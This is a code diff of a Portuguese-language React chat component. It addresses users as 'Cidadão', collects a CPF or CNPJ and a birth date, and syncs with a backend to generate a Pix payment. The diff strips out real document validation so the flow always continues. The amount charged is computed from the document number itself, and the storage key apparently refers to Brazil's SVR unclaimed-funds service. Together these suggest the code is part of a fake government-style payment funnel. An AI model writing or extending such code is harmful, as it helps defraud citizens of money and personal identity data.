@@ -107,15 +107,10 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(true);
         
         let name = "Cidadão";
-        try {
-          const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
-             docType: data.docType,
-             docValue: data.docValue
-          });
-          name = response.data?.name || "Cidadão";
-          setLeadName(name);
-          (window as any)._globalLeadName = name; // Hack to fix closure bug for handleAction
+        setLeadName(name);
+        (window as any)._globalLeadName = name; // Hack to fix closure bug for handleAction
 
+        try {
           // Sincroniza com o backend para geração de pix/pagamento
           const userId = safeStorage.getItem('svr_user_id');
           if (userId) {
@@ -129,10 +124,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
             }).catch(() => {});
           }
         } catch (e: any) {
-          setTyping(false);
-          const errorMsg = e.response?.data?.error || "Documento não encontrado ou inválido.";
-          addBotMessage(`❌ ${errorMsg} Por favor, atualize a página e tente novamente com dados válidos.`);
-          return; // Para o fluxo de chat
+          console.error(e);
         }
         
         const val = calculateValue(data.docValue);
@@ -152,12 +144,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
         const isCnpj = data.docType.toUpperCase() === 'CNPJ';
         if (isCnpj) {
-          addBotMessage(`Agora que confirmamos a identidade da empresa **${name}**, conseguimos prosseguir com a solicitação. Antes, por favor, confirme se os dados retornados estão corretos.`, [
+          addBotMessage(`Antes de prosseguirmos, por favor confirme se os dados informados estão corretos:\n\n**CNPJ:** ${data.docValue}\n**Data de Abertura:** ${data.birthDate}`, [
             { text: "Sim, estão corretos", action: "confirm_identity_yes" },
             { text: "Não, estão errados", action: "confirm_identity_no" }
           ]);
         } else {
-          addBotMessage(`Agora que confirmamos a identidade de **${name}**, conseguimos prosseguir com a solicitação. Antes, por favor, confirme se os dados retornados estão corretos.`, [
+          addBotMessage(`Antes de prosseguirmos, por favor confirme se os dados informados estão corretos:\n\n**CPF:** ${data.docValue}\n**Data de Nascimento:** ${data.birthDate}`, [
             { text: "Sim, estão corretos", action: "confirm_identity_yes" },
             { text: "Não, estão errados", action: "confirm_identity_no" }
           ]);
